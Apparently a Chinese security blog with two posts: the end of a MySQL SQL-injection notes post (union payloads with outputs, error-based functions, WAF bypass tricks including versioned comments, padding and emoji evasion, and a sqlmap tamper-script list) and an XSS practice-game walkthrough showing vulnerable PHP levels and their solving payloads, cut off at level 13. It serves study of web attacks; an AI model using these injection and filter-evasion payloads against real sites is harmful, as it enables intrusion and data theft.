mysql&gt; select * from stu where id=8e0union(select+1,(select schema_name from information_schema.schemata limit 1,1));
+------+------------+
| id   | name       |
+------+------------+
|    1 | challenges |
+------+------------+
1 row in set (0.00 sec)

(2) - 用法

mysql&gt; select * from stu where id=8e0union(select-1,(select schema_name from information_schema.schemata limit 1,1));
+------+------------+
| id   | name       |
+------+------------+
|   -1 | challenges |
+------+------------+
1 row in set (0.00 sec)

(3) ``一些用法

mysql&gt; select * from stu where id=8e0union(select-1,(select`schema_name`from information_schema.schemata limit 1,1));
+------+------------+
| id   | name       |
+------+------------+
|   -1 | challenges |
+------+------------+
1 row in set (0.00 sec)

但是这样使用就会出错
mysql&gt; select * from stu where id=8e0union(select+1,(select schema_name from `information_schema.schemata` limit 1,1));
ERROR 1146 (42S02): Table &apos;mysql.information_schema.schemata&apos; doesn&apos;t exist

这样使用就ok

mysql&gt; select * from stu where id=8e0union(select+1,(select id from `stu` limit 1,1));
+------+------+
| id   | name |
+------+------+
|    1 | 2    |
+------+------+
1 row in set (0.00 sec)

(4) ~ 和+ - 的用法差不多

mysql&gt; select * from stu where id=8e0union(select~1,(select`name`from`stu`limit 1,1));
+---------------------+------+
| id                  | name |
+---------------------+------+
| 9223372036854775807 | ss   |
+---------------------+------+
1 row in set (0.00 sec)

(5) !

mysql&gt; select * from stu where id=8e0union(select!1,(select`name`from`stu`limit 1,1));
+------+------+
| id   | name |
+------+------+
|    0 | ss   |
+------+------+
1 row in set (0.00 sec)

(6) @    可以看到@后的值直接为null了，@后可以加任意值

mysql&gt; select * from stu where id=8e0union(select@dawdwadwadwadawdwa,(select name from`stu`limit 1,1));
+------+------+
| id   | name |
+------+------+
| NULL | ss   |
+------+------+
1 row in set (0.02 sec)

mysql&gt; select * from stu where id=8e0union(select@1,(select name from`stu`limit 1,1));
+------+------+
| id   | name |
+------+------+
| NULL | ss   |
+------+------+
1 row in set (0.16 sec)

(7) . 后可以加任意数字进行组合，结果都会返回一个空

mysql&gt; select * from stu where id=.12312321312union(select@,(select name from`stu`limit 1,1));
+------+------+
| id   | name |
+------+------+
| NULL | ss   |
+------+------+
1 row in set (0.02 sec)

(8) &apos;&apos; 单引号

mysql&gt; select * from stu where id=.1union(select&apos;1&apos;,(select name from`stu`limit 1,1));
+------+------+
| id   | name |
+------+------+
| 1    | ss   |
+------+------+
1 row in set (0.00 sec)

(9) ()

mysql&gt; select * from stu where id=0e1union(select(1),(select(name)from(stu)limit 1,1));
+------+------+
| id   | name |
+------+------+
|    1 | ss   |
+------+------+
1 row in set (0.00 sec)

(10) {}  花括号的一些用法

    1.将多个独立语句合并为一个复合语句        例如：if...else...
    2.在变量间接引用中进行定界，避免歧义    例如：${$my_var[8]}与${$my_var}[8]的区分
    3.用于指示字符串变量中的单个字符，避免歧义    
    例如：
        $my_str = &quot;1234&quot;;
        $my_str{1} = &apos;5&apos;;  //这个时候$my_str中的值为&quot;1534&quot;
    这种用法为PHP5以上版本之后的特性，用于消除使用中括号引起的歧义
    4.界定变量的名称        
    例如：
        $var = &apos;sky&apos;;
        echo &quot;{$var}boy&quot;;
    5.主要用来输出复杂变量
</code></pre><hr>
<p>三、MySQL中的函数：</p>
<pre><code>(1)字符串转换函数     

Unhex()与hex()函数 可以转换多个字符  
ascii()输出10进制的ascii---char()只能转换第一个字符

mysql&gt; select unhex(hex(@@version));
+-----------------------+
| unhex(hex(@@version)) |
+-----------------------+
| 5.5.53                |
+-----------------------+
1 row in set (0.00 sec)

unhex(version())=352E352E3533

mysql&gt; select unhex(352E352E3533);
ERROR 1367 (22007): Illegal double &apos;352E352&apos; value found during parsing
mysql&gt; select unhex(hex(version()));
+-----------------------+
| unhex(hex(version())) |
+-----------------------+
| 5.5.53                |
+-----------------------+
1 row in set (0.00 sec)

(2) concat(),concat_ws()函数，一般用于连接字符串,参数可以有很多,concat_ws()的第一个参数是用来分割的

mysql&gt; select concat(0x7e,@@version);
+------------------------+
| concat(0x7e,@@version) |
+------------------------+
| ~5.5.53                |
+------------------------+
1 row in set (0.00 sec)

(3) distinct  distinctrow用来去重
    all()只能有一个参数
    distinct()可以有多个参数
    distinctrow()只能有一个参数
    都可以单独使用，如 select all 1；

group_concat(distinct column_name)    与group by配合使用，添加distinct后，将不同的column_name连接起来

mysql&gt; select group_concat(distinct @@version,user());
+-----------------------------------------+
| group_concat(distinct @@version,user()) |
+-----------------------------------------+
| 5.5.53root@localhost                    |
+-----------------------------------------+
1 row in set (0.00 sec)

mysql&gt; select/*!distinctrow*/*/**/from/*!stu*//*!where*/id=1;
+------+------+
| id   | name |
+------+------+
|    1 | zs   |
|    1 | aaa  |
+------+------+
2 rows in set (0.00 sec)

(4)字符串截取函数

Mid(version(),1,1)
Substr(version(),1,1)
Substring(version(),1,1)
Lpad(version(),1,1)
Rpad(version(),1,1)
Left(version(),1)
reverse(right(reverse(version()),1)

mysql&gt; select reverse(right(reverse(version()),6));
+--------------------------------------+
| reverse(right(reverse(version()),6)) |
+--------------------------------------+
| 5.5.53                               |
+--------------------------------------+
1 row in set (0.00 sec)

(5)exec()

(6)报错函数
procedure analyse()
updatexml()
extracavalue()
exp()
ceil()
atan()
sqrt()
floor()
ceiling()
tan()
rand()
sign()
greatest()
</code></pre><hr>
<h2 id="四、waf绕过的一些技巧"><a href="#四、waf绕过的一些技巧" class="headerlink" title="四、waf绕过的一些技巧"></a>四、waf绕过的一些技巧</h2><pre><code>过滤了逗号
(1)limit处的逗号：
limit 1 offset 0
(2)字符串截取处的逗号
mid处的逗号：
mid(version() from 1 for 1)
mysql中的自定义变量：
</code></pre><hr>
<pre><code>当过滤了union+select+from时可以用自定义变量组合成select+from+union

例：
payload：id=2|@pwd:=(select/*dd*/user/*dd*/from/*dd*/user/*dd*/where/*dd*/host=&apos;localhost&apos;)/*dd*/union/*dd*/select/*dd*/@pwd
mysql&gt; select name from stu where id=2|@pwd:=(select user from user where host=&apos;localhost&apos;)/*!union select @pwd*/;
+------+
| name |
+------+
| ss   |
| root |
+------+
2 rows in set (0.05 sec)
</code></pre><hr>
<pre><code>fuzz了下/*!50000select*/这个5位数，前两位数&lt;50 &amp;&amp; 第二位!==0 &amp;&amp; 后三位数==0即可bypass。(一点细节也不要放过。)

当union+select拦截，select+from拦截，union+from不拦截的时候，关键时绕过select这个关键字    

1.例
payload:
        id=2 union/*!12312%0aselect all*/user(),version() from stu
        id=1&apos; union/*!50000select%0aall*/username from users%23
        id=1&apos; union/*!50000select%0adistinct*/username from users%23
        id=1&apos; union/*!50000select%0adistinctrow*/username from users%23

mysql&gt; select id,name from stu where id=2 union/*!12312
-&gt; select all*/user(),version() from stu;
+----------------+--------+
| id             | name   |
+----------------+--------+
| 2              | ss     |
| root@localhost | 5.5.53 |
+----------------+--------+
2 rows in set (0.00 sec)
</code></pre><hr>
<pre><code>超长字符串查询，可能会让waf挂掉
payload：
        /*66666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666*/

云锁超长字符串绕过：

    云锁在开始检测时先判断包的大小是否为7250byte以下，n为填充包内容，设置n大小为2328时，可以正常访问页面，但是会提示拦截了SQL注入
    当数据包超过2329时就可以成功绕过，2329长度以后的就不检测了。
</code></pre><hr>
<pre><code>表情包绕过，愤怒表情，urlencode=%f0%9f%98%0a
最后一位是%a0，那么也就是说完全可以忽略掉最后一位，而多数emoji第四位是 ascii 127的字符，会导致waf引擎无法检测。
</code></pre><hr>
<pre><code>双重编码：

这个要视场景而定，如果确定一个带有waf的site存在解码后注入的漏洞的话，会有效避过waf。

    unlencode
    base64
    json
    binary
    querystring
    htmlencode
    unicode
    php serialize
</code></pre><hr>
<pre><code>宽字节注入

待补充
</code></pre><hr>
<p> 五、sqlmap自动化bypass：</p>
<pre><code> apostrophemask.py 用UTF-8全角字符替换单引号字符
apostrophenullencode.py 用非法双字节unicode字符替换单引号字符
appendnullbyte.py 在payload末尾添加空字符编码
base64encode.py 对给定的payload全部字符使用Base64编码
between.py 分别用“NOT BETWEEN 0 AND #”替换大于号“&gt;”，“BETWEEN # AND #”替换等于号“=”
bluecoat.py 在SQL语句之后用有效的随机空白符替换空格符，随后用“LIKE”替换等于号“=”
chardoubleencode.py 对给定的payload全部字符使用双重URL编码（不处理已经编码的字符）
charencode.py 对给定的payload全部字符使用URL编码（不处理已经编码的字符）
charunicodeencode.py 对给定的payload的非编码字符使用Unicode URL编码（不处理已经编码的字符）
concat2concatws.py 用“CONCAT_WS(MID(CHAR(0), 0, 0), A, B)”替换像“CONCAT(A, B)”的实例
equaltolike.py 用“LIKE”运算符替换全部等于号“=”
greatest.py 用“GREATEST”函数替换大于号“&gt;”
halfversionedmorekeywords.py 在每个关键字之前添加MySQL注释
ifnull2ifisnull.py 用“IF(ISNULL(A), B, A)”替换像“IFNULL(A, B)”的实例
lowercase.py 用小写值替换每个关键字字符
modsecurityversioned.py 用注释包围完整的查询
modsecurityzeroversioned.py 用当中带有数字零的注释包围完整的查询
multiplespaces.py 在SQL关键字周围添加多个空格
nonrecursivereplacement.py 用representations替换预定义SQL关键字，适用于过滤器
overlongutf8.py 转换给定的payload当中的所有字符
percentage.py 在每个字符之前添加一个百分号
randomcase.py 随机转换每个关键字字符的大小写
randomcomments.py 向SQL关键字中插入随机注释
securesphere.py 添加经过特殊构造的字符串
sp_password.py 向payload末尾添加“sp_password” for automatic obfuscation from DBMS logs
space2comment.py 用“/**/”替换空格符
space2dash.py 用破折号注释符“–”其次是一个随机字符串和一个换行符替换空格符
space2hash.py 用磅注释符“#”其次是一个随机字符串和一个换行符替换空格符
space2morehash.py 用磅注释符“#”其次是一个随机字符串和一个换行符替换空格符
space2mssqlblank.py 用一组有效的备选字符集当中的随机空白符替换空格符
space2mssqlhash.py 用磅注释符“#”其次是一个换行符替换空格符
space2mysqlblank.py 用一组有效的备选字符集当中的随机空白符替换空格符
space2mysqldash.py 用破折号注释符“–”其次是一个换行符替换空格符
space2plus.py 用加号“+”替换空格符
space2randomblank.py 用一组有效的备选字符集当中的随机空白符替换空格符
unionalltounion.py 用“UNION SELECT”替换“UNION ALL SELECT”
unmagicquotes.py 用一个多字节组合%bf%27和末尾通用注释一起替换空格符
varnish.py 添加一个HTTP头“X-originating-IP”来绕过WAF
versionedkeywords.py 用MySQL注释包围每个非函数关键字
versionedmorekeywords.py 用MySQL注释包围每个关键字
xforwardedfor.py 添加一个伪造的HTTP头“X-Forwarded-For”来绕过WAF
</code></pre>
          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://jaychouzzk.github.io/2019/01/06/xss小游戏/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Jaychouzzk">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Jaychouzzk's blogs">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/01/06/xss小游戏/" itemprop="url">xss小游戏</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">發表於</span>
              
              <time title="創建於" itemprop="dateCreated datePublished" datetime="2019-01-06T16:20:23+08:00">
                2019-01-06
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>下载链接：<a href="https://pan.baidu.com/s/143vKmX0mfmseIFK-iQesYg" target="_blank" rel="noopener">https://pan.baidu.com/s/143vKmX0mfmseIFK-iQesYg</a></p>
<p>参考链接：<a href="https://www.secpulse.com/archives/44299.html" target="_blank" rel="noopener">https://www.secpulse.com/archives/44299.html</a></p>
<pre><code>https://xz.aliyun.com/t/1206
</code></pre><hr>
<h2 id="less-1-–-gt-less-4"><a href="#less-1-–-gt-less-4" class="headerlink" title="less-1 –&gt;less-4"></a>less-1 –&gt;less-4</h2><p>使用鼠标点击事件加”/‘绕过即可</p>
<h2 id="less-5——————"><a href="#less-5——————" class="headerlink" title="less-5——————"></a>less-5——————</h2><pre><code>&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;
&lt;head&gt;
&lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html;charset=utf-8&quot;&gt;
&lt;script&gt;
window.alert = function()  
{     
confirm(&quot;完成的不错！&quot;);
 window.location.href=&quot;level6.php?keyword=break it out!&quot;; 
}
&lt;/script&gt;
&lt;title&gt;欢迎来到level5&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;
&lt;h1 align=center&gt;欢迎来到level5&lt;/h1&gt;
&lt;?php 
ini_set(&quot;display_errors&quot;, 0);
$str = strtolower($_GET[&quot;keyword&quot;]);               //将传递过来的字符串全部变为小写
$str2=str_replace(&quot;&lt;script&quot;,&quot;&lt;scr_ipt&quot;,$str);    //将&quot;&lt;script&quot;替换成&quot;&lt;scr_ipt&quot;
$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);            //将&quot;on&quot;替换成&quot;o_n&quot;
echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&apos;&lt;center&gt;
&lt;form action=level5.php method=GET&gt;
&lt;input name=keyword  value=&quot;&apos;.$str3.&apos;&quot;&gt;
&lt;input type=submit name=submit value=搜索 /&gt;
&lt;/form&gt;
&lt;/center&gt;&apos;;
?&gt;
&lt;center&gt;&lt;img src=level5.png&gt;&lt;/center&gt;
&lt;?php 
echo &quot;&lt;h3 align=center&gt;payload的长度:&quot;.strlen($str3).&quot;&lt;/h3&gt;&quot;;
?&gt;
&lt;/body&gt;
&lt;/html&gt;


//payload：&quot;&gt;&lt;a href=&quot;javascript:window.%61lert(1)&quot;&gt;123&lt;/a&gt;
</code></pre><h2 id="less-6——————–"><a href="#less-6——————–" class="headerlink" title="less-6——————–"></a>less-6——————–</h2><pre><code>&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;
&lt;head&gt;
&lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html;charset=utf-8&quot;&gt;
&lt;script&gt;
window.alert = function()  
{     
confirm(&quot;完成的不错！&quot;);
 window.location.href=&quot;level7.php?keyword=move up!&quot;; 
}
&lt;/script&gt;
&lt;title&gt;欢迎来到level6&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;
&lt;h1 align=center&gt;欢迎来到level6&lt;/h1&gt;
&lt;?php 
ini_set(&quot;display_errors&quot;, 0);
$str = $_GET[&quot;keyword&quot;];
$str2=str_replace(&quot;&lt;script&quot;,&quot;&lt;scr_ipt&quot;,$str);
$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);
$str4=str_replace(&quot;src&quot;,&quot;sr_c&quot;,$str3);
$str5=str_replace(&quot;data&quot;,&quot;da_ta&quot;,$str4);
$str6=str_replace(&quot;href&quot;,&quot;hr_ef&quot;,$str5);
echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&apos;&lt;center&gt;
&lt;form action=level6.php method=GET&gt;
&lt;input name=keyword  value=&quot;&apos;.$str6.&apos;&quot;&gt;
&lt;input type=submit name=submit value=搜索 /&gt;
&lt;/form&gt;
&lt;/center&gt;&apos;;
?&gt;
&lt;center&gt;&lt;img src=level6.png&gt;&lt;/center&gt;
&lt;?php 
echo &quot;&lt;h3 align=center&gt;payload的长度:&quot;.strlen($str6).&quot;&lt;/h3&gt;&quot;;
?&gt;
&lt;/body&gt;
&lt;/html&gt;

//payload：&quot;&gt;&lt;a Href=&quot;javascript:window.alert(1)&quot;&gt;123&lt;/a&gt;
</code></pre><h2 id="less-7———————"><a href="#less-7———————" class="headerlink" title="less-7———————"></a>less-7———————</h2><pre><code>&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;
&lt;head&gt;
&lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html;charset=utf-8&quot;&gt;
&lt;script&gt;
window.alert = function()  
{     
confirm(&quot;完成的不错！&quot;);
 window.location.href=&quot;level8.php?keyword=nice try!&quot;; 
}
&lt;/script&gt;
&lt;title&gt;欢迎来到level7&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;
&lt;h1 align=center&gt;欢迎来到level7&lt;/h1&gt;
&lt;?php 
ini_set(&quot;display_errors&quot;, 0);
$str =strtolower( $_GET[&quot;keyword&quot;]);
$str2=str_replace(&quot;script&quot;,&quot;&quot;,$str);
$str3=str_replace(&quot;on&quot;,&quot;&quot;,$str2);
$str4=str_replace(&quot;src&quot;,&quot;&quot;,$str3);
$str5=str_replace(&quot;data&quot;,&quot;&quot;,$str4);
$str6=str_replace(&quot;href&quot;,&quot;&quot;,$str5);
echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&apos;&lt;center&gt;
&lt;form action=level7.php method=GET&gt;
&lt;input name=keyword  value=&quot;&apos;.$str6.&apos;&quot;&gt;
&lt;input type=submit name=submit value=搜索 /&gt;
&lt;/form&gt;
&lt;/center&gt;&apos;;
?&gt;
&lt;center&gt;&lt;img src=level7.png&gt;&lt;/center&gt;
&lt;?php 
echo &quot;&lt;h3 align=center&gt;payload的长度:&quot;.strlen($str6).&quot;&lt;/h3&gt;&quot;;
?&gt;
&lt;/body&gt;
&lt;/html&gt;

//payload：&quot; oonnclick=window.alert(1);//
</code></pre><h2 id="less-8————————–"><a href="#less-8————————–" class="headerlink" title="less-8————————–"></a>less-8————————–</h2><pre><code>&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;
&lt;head&gt;
&lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html;charset=utf-8&quot;&gt;
&lt;script&gt;
window.alert = function()  
{     
confirm(&quot;完成的不错！&quot;);
 window.location.href=&quot;level9.php?keyword=not bad!&quot;; 
}
&lt;/script&gt;
&lt;title&gt;欢迎来到level8&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;
&lt;h1 align=center&gt;欢迎来到level8&lt;/h1&gt;
&lt;?php 
ini_set(&quot;display_errors&quot;, 0);
$str = strtolower($_GET[&quot;keyword&quot;]);
$str2=str_replace(&quot;script&quot;,&quot;scr_ipt&quot;,$str);
$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);
$str4=str_replace(&quot;src&quot;,&quot;sr_c&quot;,$str3);
$str5=str_replace(&quot;data&quot;,&quot;da_ta&quot;,$str4);
$str6=str_replace(&quot;href&quot;,&quot;hr_ef&quot;,$str5);
$str7=str_replace(&apos;&quot;&apos;,&apos;&amp;quot&apos;,$str6);
echo &apos;&lt;center&gt;
&lt;form action=level8.php method=GET&gt;
&lt;input name=keyword  value=&quot;&apos;.htmlspecialchars($str).&apos;&quot;&gt;
&lt;input type=submit name=submit value=添加友情链接 /&gt;
&lt;/form&gt;
&lt;/center&gt;&apos;;
?&gt;
&lt;?php
 echo &apos;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;&apos;.$str7.&apos;&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&apos;;
?&gt;
&lt;center&gt;&lt;img src=level8.jpg&gt;&lt;/center&gt;
&lt;?php 
echo &quot;&lt;h3 align=center&gt;payload的长度:&quot;.strlen($str7).&quot;&lt;/h3&gt;&quot;;
?&gt;
&lt;/body&gt;
&lt;/html&gt;

//payload：javascri&amp;#x0070;t:alert()
</code></pre><h2 id="less-9—————————"><a href="#less-9—————————" class="headerlink" title="less-9—————————-"></a>less-9—————————-</h2><pre><code>&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;
&lt;head&gt;
&lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html;charset=utf-8&quot;&gt;
&lt;script&gt;
window.alert = function()  
{     
confirm(&quot;完成的不错！&quot;);
 window.location.href=&quot;level10.php?keyword=well done!&quot;; 
}
&lt;/script&gt;
&lt;title&gt;欢迎来到level9&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;
&lt;h1 align=center&gt;欢迎来到level9&lt;/h1&gt;
&lt;?php 
ini_set(&quot;display_errors&quot;, 0);
$str = strtolower($_GET[&quot;keyword&quot;]);
$str2=str_replace(&quot;script&quot;,&quot;scr_ipt&quot;,$str);
$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);
$str4=str_replace(&quot;src&quot;,&quot;sr_c&quot;,$str3);
$str5=str_replace(&quot;data&quot;,&quot;da_ta&quot;,$str4);
$str6=str_replace(&quot;href&quot;,&quot;hr_ef&quot;,$str5);
$str7=str_replace(&apos;&quot;&apos;,&apos;&amp;quot&apos;,$str6);
echo &apos;&lt;center&gt;
&lt;form action=level9.php method=GET&gt;
&lt;input name=keyword  value=&quot;&apos;.htmlspecialchars($str).&apos;&quot;&gt;
&lt;input type=submit name=submit value=添加友情链接 /&gt;
&lt;/form&gt;
&lt;/center&gt;&apos;;
?&gt;
&lt;?php
if(false===strpos($str7,&apos;http://&apos;))   //查找&quot;http://&quot;第一次出现的位置
{
  echo &apos;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;您的链接不合法？有没有！&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&apos;;
        }
else
{
  echo &apos;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;&apos;.$str7.&apos;&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&apos;;
}
?&gt;
&lt;center&gt;&lt;img src=level9.png&gt;&lt;/center&gt;
&lt;?php 
echo &quot;&lt;h3 align=center&gt;payload的长度:&quot;.strlen($str7).&quot;&lt;/h3&gt;&quot;;
?&gt;
&lt;/body&gt;
&lt;/html&gt;

//payload：javascri&amp;#x0070;t:alert()//http://
</code></pre><h2 id="less-10—————————"><a href="#less-10—————————" class="headerlink" title="less-10—————————"></a>less-10—————————</h2><pre><code>&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;
&lt;head&gt;
&lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html;charset=utf-8&quot;&gt;
&lt;script&gt;
window.alert = function()  
{     
confirm(&quot;完成的不错！&quot;);
 window.location.href=&quot;level11.php?keyword=good job!&quot;; 
}
&lt;/script&gt;
&lt;title&gt;欢迎来到level10&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;
&lt;h1 align=center&gt;欢迎来到level10&lt;/h1&gt;
&lt;?php 
ini_set(&quot;display_errors&quot;, 0);
$str = $_GET[&quot;keyword&quot;];
$str11 = $_GET[&quot;t_sort&quot;];
$str22=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str11);
$str33=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22);
echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&apos;&lt;center&gt;
&lt;form id=search&gt;
&lt;input name=&quot;t_link&quot;  value=&quot;&apos;.&apos;&quot; type=&quot;hidden&quot;&gt;
&lt;input name=&quot;t_history&quot;  value=&quot;&apos;.&apos;&quot; type=&quot;hidden&quot;&gt;
&lt;input name=&quot;t_sort&quot;  value=&quot;&apos;.$str33.&apos;&quot; type=&quot;hidden&quot;&gt;
&lt;/form&gt;
&lt;/center&gt;&apos;;
?&gt;
&lt;center&gt;&lt;img src=level10.png&gt;&lt;/center&gt;
&lt;?php 
echo &quot;&lt;h3 align=center&gt;payload的长度:&quot;.strlen($str).&quot;&lt;/h3&gt;&quot;;
?&gt;
&lt;/body&gt;
&lt;/html&gt;

//payload：keyword=&amp;t_sort=&quot;onclick=window.alert(1); type=&quot;text&quot;//
</code></pre><h2 id="less-11——————————"><a href="#less-11——————————" class="headerlink" title="less-11——————————-"></a>less-11——————————-</h2><pre><code>&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;
&lt;head&gt;
&lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html;charset=utf-8&quot;&gt;
&lt;script&gt;
window.alert = function()  
{     
confirm(&quot;完成的不错！&quot;);
 window.location.href=&quot;level12.php?keyword=good job!&quot;; 
}
&lt;/script&gt;
&lt;title&gt;欢迎来到level11&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;
&lt;h1 align=center&gt;欢迎来到level11&lt;/h1&gt;
&lt;?php 
ini_set(&quot;display_errors&quot;, 0);
$str = $_GET[&quot;keyword&quot;];
$str00 = $_GET[&quot;t_sort&quot;];
$str11=$_SERVER[&apos;HTTP_REFERER&apos;];    //获取前一页的url
$str22=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str11);
$str33=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22);
echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&apos;&lt;center&gt;
&lt;form id=search&gt;
&lt;input name=&quot;t_link&quot;  value=&quot;&apos;.&apos;&quot; type=&quot;hidden&quot;&gt;
&lt;input name=&quot;t_history&quot;  value=&quot;&apos;.&apos;&quot; type=&quot;hidden&quot;&gt;
&lt;input name=&quot;t_sort&quot;  value=&quot;&apos;.htmlspecialchars($str00).&apos;&quot; type=&quot;hidden&quot;&gt;
&lt;input name=&quot;t_ref&quot;  value=&quot;&apos;.$str33.&apos;&quot; type=&quot;hidden&quot;&gt;
&lt;/form&gt;
&lt;/center&gt;&apos;;
?&gt;
&lt;center&gt;&lt;img src=level11.png&gt;&lt;/center&gt;
&lt;?php 
echo &quot;&lt;h3 align=center&gt;payload的长度:&quot;.strlen($str).&quot;&lt;/h3&gt;&quot;;
?&gt;
&lt;/body&gt;
&lt;/html&gt;

当第10关跳转到第11关的时候，使用burpsuite抓包，修改referer的值即可
//payload：t_sort=&quot;onclick=window.alert(1); type=&quot;text&quot;//
</code></pre><h2 id="less-12—————————"><a href="#less-12—————————" class="headerlink" title="less-12—————————"></a>less-12—————————</h2><pre><code>&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;
&lt;head&gt;
&lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html;charset=utf-8&quot;&gt;
&lt;script&gt;
window.alert = function()  
{     
confirm(&quot;完成的不错！&quot;);
 window.location.href=&quot;level13.php?keyword=good job!&quot;; 
}
&lt;/script&gt;
&lt;title&gt;欢迎来到level12&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;
&lt;h1 align=center&gt;欢迎来到level12&lt;/h1&gt;
&lt;?php 
ini_set(&quot;display_errors&quot;, 0);
$str = $_GET[&quot;keyword&quot;];
$str00 = $_GET[&quot;t_sort&quot;];
$str11=$_SERVER[&apos;HTTP_USER_AGENT&apos;];    //获取User-Agent内容
$str22=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str11);
$str33=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22);
echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&apos;&lt;center&gt;
&lt;form id=search&gt;
&lt;input name=&quot;t_link&quot;  value=&quot;&apos;.&apos;&quot; type=&quot;hidden&quot;&gt;
&lt;input name=&quot;t_history&quot;  value=&quot;&apos;.&apos;&quot; type=&quot;hidden&quot;&gt;
&lt;input name=&quot;t_sort&quot;  value=&quot;&apos;.htmlspecialchars($str00).&apos;&quot; type=&quot;hidden&quot;&gt;
&lt;input name=&quot;t_ua&quot;  value=&quot;&apos;.$str33.&apos;&quot; type=&quot;hidden&quot;&gt;
&lt;/form&gt;
&lt;/center&gt;&apos;;
?&gt;
&lt;center&gt;&lt;img src=level12.png&gt;&lt;/center&gt;
&lt;?php 
echo &quot;&lt;h3 align=center&gt;payload的长度:&quot;.strlen($str).&quot;&lt;/h3&gt;&quot;;
?&gt;
&lt;/body&gt;
&lt;/html&gt;

修改user-agent
//payload：&quot;onclick=window.alert(1); type=&quot;text&quot;//
</code></pre><h2 id="less-13—————————"><a href="#less-13—————————" class="headerlink" title="less-13—————————-"></a>less-13—————————-</h2><pre><code>&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;
&lt;head&gt;
&lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html;charset=utf-8&quot;&gt;
&lt;script&gt;
window.alert = function()  
{     
confirm(&quot;完成的不错！&quot;);
 window.location.href=&quot;level14.php&quot;; 
}
&lt;/script&gt;
&lt;title&gt;欢迎来到level13&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;
&lt;h1 align=center&gt;欢迎来到level13&lt;/h1&gt;
&lt;?php 
setcookie(&quot;user&quot;, &quot;call me maybe?&quot;, time()+3600);
ini_set(&quot;display_errors&quot;, 0);
$str = $_GET[&quot;keyword&quot;];
$str00 = $_GET[&quot;t_sort&quot;];
$str11=$_COOKIE[&quot;user&quot;];
$str22=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str11);
$str33=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22);
